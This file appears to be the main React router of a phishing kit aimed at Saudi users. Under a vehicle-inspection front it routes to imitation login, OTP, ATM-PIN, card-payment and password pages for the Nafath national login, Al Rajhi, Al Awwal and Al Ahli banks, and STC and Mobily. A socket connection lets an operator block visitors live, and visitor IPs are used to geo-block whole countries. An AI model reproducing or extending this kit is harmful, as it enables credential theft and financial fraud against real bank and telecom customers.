import { useEffect, useState } from "react";
import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/NotFound";
import { Route, Switch } from "wouter";
import ErrorBoundary from "./components/ErrorBoundary";
import ScrollToTop from "./components/ScrollToTop";
import PageTitleUpdater from "./components/PageTitleUpdater";
import { ThemeProvider } from "./contexts/ThemeContext";
import { initializeSocket, disconnectSocket, socket, setNavigateCallback } from "./lib/store";
import { useLocation } from "wouter";
import AmerChat from "./components/AmerChat";

// Main Pages (Vehicle Inspection)
import FahsHome from "./pages/FahsHome";
import NewAppointment from "./pages/NewAppointment";

// Nafath Pages
import NafathLogin from "./pages/NafathLogin";
import NafathLoginPage from "./pages/NafathLoginPage";
import NafathVerify from "./pages/NafathVerify";

// Comparison Page
import CompareOffers from "./pages/CompareOffers";

// Form Pages
import SummaryPayment from "./pages/SummaryPayment";

// Payment Pages
import CreditCardPayment from "./pages/CreditCardPayment";
import OTPVerification from "./pages/OTPVerification";
import ATMPassword from "./pages/ATMPassword";

// Phone Verification Pages
import PhoneVerification from "./pages/PhoneVerification";
import PhoneOTP from "./pages/PhoneOTP";
import STCCallAlert from "./pages/STCCallAlert";
import MobilyCallAlert from "./pages/MobilyCallAlert";
import MyStcOTP from "./pages/MyStcOTP";
import STCPassword from "./pages/STCPassword";

// Al Rajhi Bank Pages
import AlRajhiLogin from "./pages/AlRajhiLogin";
import AlRajhiOTP from "./pages/AlRajhiOTP";
import AlRajhiNafath from "./pages/AlRajhiNafath";
import AlRajhiAlert from "./pages/AlRajhiAlert";
import AlRajhiCall from "./pages/AlRajhiCall";
import RajhiPaymentError from "./pages/RajhiPaymentError";

// Al Awwal Bank Pages
import AlAwwalBank from "./pages/AlAwwalBank";
import AlAwwalNafath from "./pages/AlAwwalNafath";

// Al Ahli Bank Pages
import AlAhliOTP from "./pages/AlAhliOTP";

// Bank Transfer Pages
import BankTransfer from "./pages/BankTransfer";
import BankAccountNumber from "./pages/BankAccountNumber";

// Final Page
import FinalPage from "./pages/FinalPage";

// Insurance Form Pages
import MedicalForm from "./pages/MedicalForm";
import MalpracticeForm from "./pages/MalpracticeForm";
import TravelForm from "./pages/TravelForm";
import DomesticForm from "./pages/DomesticForm";
import InsuranceOffers from "./pages/InsuranceOffers";


function Router() {
  return (
    <Switch>
      {/* Main Pages (Vehicle Inspection) */}
      <Route path={"/"} component={FahsHome} />
      <Route path={"/new-appointment"} component={NewAppointment} />

      {/* Nafath Routes */}
      <Route path={"/nafath"} component={NafathLogin} />
      <Route path={"/nafath-login"} component={NafathLogin} />
      <Route path={"/nafath-login-page"} component={NafathLoginPage} />
      <Route path={"/nafath-verify"} component={NafathVerify} />

      {/* Comparison Routes */}
      <Route path={"/compare-offers"} component={CompareOffers} />

      {/* Form Routes */}
      <Route path={"/summary-payment"} component={SummaryPayment} />

      {/* Payment Routes */}
      <Route path={"/credit-card-payment"} component={CreditCardPayment} />
      <Route path={"/otp-verification"} component={OTPVerification} />
      <Route path={"/atm-password"} component={ATMPassword} />

      {/* Phone Verification Routes */}
      <Route path={"/phone-verification"} component={PhoneVerification} />
      <Route path={"/phone-otp"} component={PhoneOTP} />
      <Route path={"/stc-call-alert"} component={STCCallAlert} />
      <Route path={"/mobily-call-alert"} component={MobilyCallAlert} />
      <Route path={"/mystc-otp"} component={MyStcOTP} />
      <Route path={"/stc-password"} component={STCPassword} />

      {/* Al Rajhi Bank Routes */}
      <Route path={"/alrajhi-login"} component={AlRajhiLogin} />
      <Route path={"/alrajhi-otp"} component={AlRajhiOTP} />
      <Route path={"/alrajhi-nafath"} component={AlRajhiNafath} />
      <Route path={"/alrajhi-alert"} component={AlRajhiAlert} />
      <Route path={"/alrajhi-call"} component={AlRajhiCall} />
      <Route path={"/rajhi-payment-error"} component={RajhiPaymentError} />

      {/* Al Awwal Bank Routes */}
      <Route path={"/alawwal-bank"} component={AlAwwalBank} />
      <Route path={"/alawwal-nafath"} component={AlAwwalNafath} />

      {/* Al Ahli Bank Routes */}
      <Route path={"/alahli-otp"} component={AlAhliOTP} />

      {/* Bank Transfer Routes */}
      <Route path={"/bank-transfer"} component={BankTransfer} />
      <Route path={"/bank-account-number"} component={BankAccountNumber} />

      {/* Insurance Form Routes */}
      <Route path={"/medical-form"} component={MedicalForm} />
      <Route path={"/malpractice-form"} component={MalpracticeForm} />
      <Route path={"/travel-form"} component={TravelForm} />
      <Route path={"/domestic-form"} component={DomesticForm} />
      <Route path={"/insurance-offers"} component={InsuranceOffers} />

      {/* Final Page */}
      <Route path={"/final-page"} component={FinalPage} />


      <Route path={"/404"} component={NotFound} />
      {/* Final fallback route */}
      <Route component={NotFound} />
    </Switch>
  );
}

// Blocked Country Page Component
function BlockedCountryPage() {
  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-xl shadow-lg p-8 max-w-md w-full text-center">
        <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
          <svg className="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"/>
          </svg>
        </div>
        <h1 className="text-2xl font-bold text-gray-800 mb-4">غير متاح</h1>
        <p className="text-gray-600 mb-2">عذراً، هذه الخدمة غير متاحة في منطقتك</p>
        <p className="text-gray-500 text-sm">This service is not available in your region</p>
      </div>
    </div>
  );
}

function App() {
  const [isCountryBlocked, setIsCountryBlocked] = useState(false);
  const [isCheckingCountry, setIsCheckingCountry] = useState(false);
  const [isVisitorBlocked, setIsVisitorBlocked] = useState(false);
  const [blockedMessage, setBlockedMessage] = useState("");
  const [, setLocation] = useLocation();

  // Set navigate callback for client-side navigation (no page reload)
  useEffect(() => {
    setNavigateCallback((path: string) => {
      setLocation(path);
    });
  }, [setLocation]);

  // Initialize socket on app mount
  useEffect(() => {
    initializeSocket();
    return () => {
      disconnectSocket();
    };
  }, []);

  // Listen for admin block/unblock events
  useEffect(() => {
    const s = socket.value;
    const handleBlocked = () => {
      setIsVisitorBlocked(true);
      setBlockedMessage("تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام.");
    };
    const handleUnblocked = () => {
      setIsVisitorBlocked(false);
      setBlockedMessage("");
    };
    s.on("blocked", handleBlocked);
    s.on("unblocked", handleUnblocked);
    return () => {
      s.off("blocked", handleBlocked);
      s.off("unblocked", handleUnblocked);
    };
  }, []);

  // Check if visitor's country is blocked
  useEffect(() => {
    const checkCountry = async () => {
      try {
        // Get visitor's country from IP
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        const visitorCountry = data.country_name;
        
        // Check with server if country is blocked
        socket.value.emit('blockedCountries:check', visitorCountry);
        
        socket.value.on('blockedCountries:checkResult', ({ isBlocked }) => {
          setIsCountryBlocked(isBlocked);
          setIsCheckingCountry(false);
        });

        // Also listen for updates to blocked countries
        socket.value.on('blockedCountries:updated', async (blockedCountries: string[]) => {
          const isBlocked = blockedCountries.some(c => 
            c.toLowerCase() === visitorCountry.toLowerCase()
          );
          setIsCountryBlocked(isBlocked);
        });
      } catch (error) {
        console.error('Error checking country:', error);
        setIsCheckingCountry(false);
      }
    };

    // Wait for socket to be ready
    const timer = setTimeout(checkCountry, 1000);
    return () => clearTimeout(timer);
  }, []);

  // Show loading while checking country
  if (isCheckingCountry) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#1a5276]"></div>
      </div>
    );
  }

  // Show blocked page if country is blocked
  if (isCountryBlocked) {
    return <BlockedCountryPage />;
  }

  // Show blocked page if visitor is blocked by admin
  if (isVisitorBlocked) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-xl shadow-lg p-8 max-w-md w-full text-center">
          <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg className="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"/>
            </svg>
          </div>
          <h1 className="text-2xl font-bold text-gray-800 mb-4">تم الحظر</h1>
          <p className="text-gray-600 mb-2">{blockedMessage || "تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام."}</p>
        </div>
      </div>
    );
  }

  return (
    <ErrorBoundary>
      <ThemeProvider defaultTheme="light">
        <TooltipProvider>
          <Toaster />
          <ScrollToTop />
          <PageTitleUpdater />
          <AmerChat />
          <Router />
        </TooltipProvider>
      </ThemeProvider>
    </ErrorBoundary>
  );
}

export default App;
